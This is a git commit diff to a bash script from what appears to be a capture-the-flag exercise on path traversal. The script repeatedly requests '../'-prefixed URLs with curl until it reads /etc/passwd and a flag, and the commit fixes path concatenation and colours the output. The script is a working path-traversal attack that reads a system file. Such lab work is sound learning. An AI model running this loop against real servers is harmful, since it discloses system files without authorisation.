ab7c64260117d649975cba8a14884cd4ea0b8485
mat <mat@gmail.com>
2024-02-05 23:47:15 +0100

    removing small syntax problem in path + success phrase in green

--- vulnerabilities/path_trasversal/Ressources/search_path.sh
+++ vulnerabilities/path_trasversal/Ressources/search_path.sh
@@ -6,16 +6,16 @@ response=$(curl -s "$url$path/etc/passwd")
 
 while [[ ! $response =~  "The flag is" ]]; do
     path+="../"
-    response=$(curl -s "$url$path/etc/passwd")
-    echo "Nothing found at $url$path/etc/passwd"
+    response=$(curl -s "${url}${path}etc/passwd")
+    echo "Nothing found at ${url}${path}etc/passwd"
     echo
 done
 
-echo "Vulnerable path found: $url$path/etc/passwd"
+echo -e "\e[32mVulnerable path found: ${url}${path}etc/passwd\e[0m"
 
 figlet YES YOU DID IT CLEM AND MAT !
 
-echo "Here below the response containg the flag:"
+echo "Here below the response containing the flag:"
 echo
 echo "$response"
 
